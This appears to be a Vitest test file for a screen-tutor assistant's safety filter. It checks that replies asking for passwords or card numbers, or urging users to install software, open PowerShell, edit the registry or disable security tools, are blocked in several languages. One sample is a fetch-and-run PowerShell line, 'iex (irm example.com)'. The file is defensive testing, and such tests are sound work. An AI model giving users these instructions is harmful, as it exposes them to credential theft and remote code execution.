import { describe, expect, it } from "vitest";

import type { ScreenTutorResponse } from "./screen";
import {
  checkScreenActions,
  checkScreenReply,
  SAFE_FALLBACK,
  unsafeReasons,
} from "./screen-safety";

const reply = (speech: string, actions: ScreenTutorResponse["actions"] = []) =>
  ({ speech, actions, mode: "answer" }) as const satisfies ScreenTutorResponse;

describe("screen reply safety in other languages", () => {
  it.each([
    ["Entrez votre mot de passe ici.", "asks_for_secrets"],
    ["Saisissez le numéro de carte bancaire.", "asks_for_payment"],
    ["Réinstallez le logiciel.", "install_software"],
    ["Ouvrez l'invite de commandes.", "run_commands"],
    ["Ouvrez l'éditeur du registre.", "edit_registry"],
    ["Désactivez le pare-feu.", "disable_security"],
    ["请在这里输入你的密码。", "asks_for_secrets"],
    ["请将您的密码输入方框中。", "asks_for_secrets"],
    ["请把银行卡号填写在这里。", "asks_for_payment"],
    ["Veuillez taper votre mot de passe dans la boite.", "asks_for_secrets"],
    ["Veuillez desactiver le pare-feu.", "disable_security"],
    ["请填写你的信用卡信息。", "asks_for_payment"],
    ["先安装这个程序。", "install_software"],
    ["打开命令提示符。", "run_commands"],
    ["打开注册表。", "edit_registry"],
    ["关闭防火墙。", "disable_security"],
    ["এখানে আপনার পাসওয়ার্ড লিখুন।", "asks_for_secrets"],
    ["আপনার ক্রেডিট কার্ড নম্বর দিন।", "asks_for_payment"],
    ["এই প্রোগ্রামটি ইনস্টল করুন।", "install_software"],
    ["কমান্ড প্রম্পট খুলুন।", "run_commands"],
    ["রেজিস্ট্রি খুলুন।", "edit_registry"],
    ["ফায়ারওয়াল বন্ধ করুন।", "disable_security"],
  ])("blocks %s", (text, reason) => {
    expect(unsafeReasons(text)).toEqual([reason]);
  });

  it.each([
    "Cliquez sur Insertion, puis sur Tableau croisé dynamique.",
    "点击插入，然后选择数据透视表。",
    "সন্নিবেশ ট্যাবে ক্লিক করুন, তারপর সূত্রটি দেখুন।",
  ])("lets ordinary help through: %s", (text) => {
    expect(unsafeReasons(text)).toEqual([]);
  });
});

describe("screen reply safety", () => {
  it.each([
    ["Please type your password here so I can check it.", "asks_for_secrets"],
    ["Read out the verification code you got by text.", "asks_for_secrets"],
    ["Share your recovery phrase to restore the wallet.", "asks_for_secrets"],
    ["Enter your card number to continue the trial.", "asks_for_payment"],
    ["Install the helper extension the page recommends.", "install_software"],
    ["Download and run the fixer tool.", "install_software"],
    ["Open PowerShell and paste the command from the page.", "run_commands"],
    ["Press Win + R and type cmd.", "run_commands"],
    ["Run this command: iex (irm example.com)", "run_commands"],
    ["Open regedit and delete the key.", "edit_registry"],
    ["Turn off Windows Security for a minute.", "disable_security"],
    ["Disable SmartScreen so the file opens.", "disable_security"],
  ])("blocks %j", (speech, reason) => {
    expect(unsafeReasons(speech)).toContain(reason);
    const checked = checkScreenReply(reply(speech));
    expect(checked.response).toEqual(SAFE_FALLBACK);
    expect(checked.blocked).toContain(reason);
  });

  it.each([
    "Click Insert, then PivotTable.",
    "Type the total in cell B7 and press Enter.",
    "That button saves a copy under a new name.",
    "Your password field is hidden, which is good; let's look at the menu instead.",
    "Open the terminal panel in VS Code from the View menu.",
    "Pin this tab so it stays open.",
    "This is the same idea as forces and acceleration from your course.",
  ])("lets ordinary tutoring through: %j", (speech) => {
    expect(unsafeReasons(speech)).toEqual([]);
    expect(checkScreenReply(reply(speech)).response.speech).toBe(speech);
  });

  it("checks labels and notes the overlay would write, not just the speech", () => {
    const labelled = reply("Here's the next step.", [
      { type: "point_at", point: { x: 500, y: 500 }, label: "type password here" },
    ]);
    expect(checkScreenReply(labelled).response).toEqual(SAFE_FALLBACK);

    const box = { left: 10, top: 10, right: 20, bottom: 20 };
    const noted = reply("Look here.", [
      { type: "margin_note", text: "open powershell", besideBox: box },
    ]);
    expect(checkScreenReply(noted).blocked).toEqual(["run_commands"]);

    const step = reply("Try this first.", [
      { type: "write_step", latexOrText: "regedit → delete the key", besideBox: box },
    ]);
    expect(checkScreenReply(step).blocked).toEqual(["edit_registry"]);
  });

  it("drops a whole set of re-placed ink if any of its text is unsafe", () => {
    const box = { left: 10, top: 10, right: 20, bottom: 20 };
    const safe = [{ type: "margin_note", text: "Units first", besideBox: box }] as const;
    expect(checkScreenActions(safe)).toEqual({ actions: safe, blocked: [] });
    const unsafe = [
      ...safe,
      { type: "point_at", point: { x: 1, y: 1 }, label: "install this" },
    ] as const;
    expect(checkScreenActions(unsafe)).toEqual({ actions: [], blocked: ["install_software"] });
  });

  it("keeps a safe reply exactly as it was", () => {
    const safe = reply("Click here to add a chart.", [
      { type: "point_at", point: { x: 120, y: 40 }, label: "Insert" },
    ]);
    expect(checkScreenReply(safe)).toEqual({ response: safe, blocked: [] });
  });
});
